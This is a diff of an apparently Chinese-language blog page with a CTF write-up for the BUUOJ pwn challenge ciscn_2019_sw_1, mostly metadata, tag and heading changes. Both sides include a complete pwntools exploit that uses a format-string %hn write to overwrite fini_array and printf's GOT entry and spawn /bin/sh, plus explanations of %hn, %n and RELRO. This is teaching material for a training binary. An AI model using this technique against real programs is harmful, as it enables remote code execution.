@@ -195,24 +195,33 @@
             
                 <span class="meta-info-item post-update-date">
                     <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                    <span class="datetime" data-updated="Tue Jul 22 2025 21:31:56 GMT+0800">2025-07-22 21:31:56</span>
+                    <span class="datetime" data-updated="Tue Aug 26 2025 16:15:58 GMT+0800">2025-08-26 16:15:58</span>
                 </span>
             
         
 
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/exercise-pwn/">exercise_pwn</a></li>
+                        
+                    
+                </ul>
+            </span>
         
 
         
             <span class="post-tag meta-info-item border-box">
                 <ul class="post-tag-ul">
                     
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/BUU/">BUU</a></li>
-                        
-                    
                             <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/PWN/">PWN</a></li>
                         
                     
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">格式化字符串</a></li>
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/fini-array/">fini_array</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E5%88%86%E5%AD%97%E8%8A%82/">分字节</a></li>
                         
                     
                 </ul>
@@ -248,7 +257,7 @@
 <p>用readelf去找fini_array的地址</p>
 <p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250722201754516.png"  alt="image-20250722201754516"></p>
 <p>脚本</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line">#p=process(&quot;./ciscn_2019_sw_1&quot;)</span><br><span class="line">p=remote(&quot;node5.buuoj.cn&quot;,29318)</span><br><span class="line">elf=ELF(&quot;./ciscn_2019_sw_1&quot;)</span><br><span class="line">fini=0x0804979c</span><br><span class="line">printf=elf.got[&quot;printf&quot;]</span><br><span class="line">main=0x08048534</span><br><span class="line">sys=0x080483D0</span><br><span class="line"></span><br><span class="line">sys_h=(sys&gt;&gt;16)&amp;0xffff</span><br><span class="line">sys_l=sys&amp;0xffff</span><br><span class="line">main_h=(main&gt;&gt;16)&amp;0xffff</span><br><span class="line">main_l=main&amp;0xffff</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=p32(fini+2)+p32(printf+2)+p32(printf)+p32(fini)</span><br><span class="line">payload+=b&quot;%&quot;+bytes(str(main_h-16),&quot;utf_8&quot;)+b&quot;c%4$hn&quot;</span><br><span class="line">payload+=b&quot;%5$hn&quot;</span><br><span class="line">payload+=b&quot;%&quot;+bytes(str(sys_l-main_h),&quot;utf_8&quot;)+b&quot;c%6$hn&quot;</span><br><span class="line">payload+=b&quot;%&quot;+bytes(str(main_l-sys_l),&quot;utf_8&quot;)+b&quot;c%7$hn&quot;</span><br><span class="line">payload += b&#x27;\x00&#x27;</span><br><span class="line">p.sendlineafter(b&quot;name?\n&quot;,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=b&quot;/bin/sh&quot;</span><br><span class="line">p.sendlineafter(b&quot;name?\n&quot;,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line">#p=process(&quot;./ciscn_2019_sw_1&quot;)</span><br><span class="line">p=remote(&quot;node5.buuoj.cn&quot;,29318)</span><br><span class="line">elf=ELF(&quot;./ciscn_2019_sw_1&quot;)</span><br><span class="line">fini=0x0804979c</span><br><span class="line">printf=elf.got[&quot;printf&quot;]</span><br><span class="line">main=0x08048534</span><br><span class="line">sys=0x080483D0</span><br><span class="line"></span><br><span class="line">sys_h=(sys&gt;&gt;16)&amp;0xffff</span><br><span class="line">sys_l=sys&amp;0xffff</span><br><span class="line">main_h=(main&gt;&gt;16)&amp;0xffff</span><br><span class="line">main_l=main&amp;0xffff</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=p32(fini+2)+p32(printf+2)+p32(printf)+p32(fini)</span><br><span class="line">payload+=b&quot;%&quot;+bytes(str(main_h-16),&quot;utf_8&quot;)+b&quot;c%4$hn&quot;#%c的意思是打印n个字符</span><br><span class="line">payload+=b&quot;%5$hn&quot;</span><br><span class="line">payload+=b&quot;%&quot;+bytes(str(sys_l-main_h),&quot;utf_8&quot;)+b&quot;c%6$hn&quot;</span><br><span class="line">payload+=b&quot;%&quot;+bytes(str(main_l-sys_l),&quot;utf_8&quot;)+b&quot;c%7$hn&quot;</span><br><span class="line">payload += b&#x27;\x00&#x27;</span><br><span class="line">p.sendlineafter(b&quot;name?\n&quot;,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=b&quot;/bin/sh&quot;</span><br><span class="line">p.sendlineafter(b&quot;name?\n&quot;,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 
 
@@ -287,7 +296,7 @@
 <li>这在格式化字符串里的意思<br>%100c ：向输出缓冲区写入 100个空格字符，使得“已经输出字符数”加100。</li>
 </ol>
 <p>%4$hn ：把当前的输出字符数（现在应该是前面已有字符数 + 100）写入 第4个参数指向的地址，写入2字节。</p>
-<p><strong>为什么不用 <code>%n</code> 直接写 4 字节？</strong>（两个字节用hn,四字节用n）</p>
+<h2 id="为什么不用-n-直接写-4-字节？"><a href="#为什么不用-n-直接写-4-字节？" class="headerlink" title="为什么不用 %n 直接写 4 字节？"></a>为什么不用 <code>%n</code> 直接写 4 字节？</h2><p>（两个字节用hn,四字节用n）</p>
 <p>理论上可以直接用 <code>%n</code> 一次写完整 4 字节（一个 <code>int</code>），但是：</p>
 <p>1️⃣ 数字范围的问题</p>
 <ul>
@@ -299,7 +308,7 @@
 <li><p>你需要输出 134,513,204 个字符才能让 <code>%n</code> 写出这个数……显然不现实，程序很可能崩溃或超时。</p>
 </li>
 </ul>
-<h2 id="fini-array更改原理"><a href="#fini-array更改原理" class="headerlink" title="fini.array更改原理"></a>fini.array更改原理</h2><p>🛡️ 1️⃣ RELRO 与各段的可写性</p>
+<h2 id="fini-array原理"><a href="#fini-array原理" class="headerlink" title="fini.array原理"></a>fini.array原理</h2><p>🛡️ 1️⃣ RELRO 与各段的可写性</p>
 <p>ELF 程序里有这几个关键的表&#x2F;段：</p>
 <table>
 <thead>
@@ -371,15 +380,15 @@
                             <ul class="post-tags-box border-box">
                                 
                                     <li class="tag-item border-box">
-                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/BUU/">BUU</a>
-                                    </li>
-                                
-                                    <li class="tag-item border-box">
                                         <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/PWN/">PWN</a>
                                     </li>
                                 
                                     <li class="tag-item border-box">
-                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">格式化字符串</a>
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/fini-array/">fini_array</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E5%88%86%E5%AD%97%E8%8A%82/">分字节</a>
                                     </li>
                                 
                             </ul>
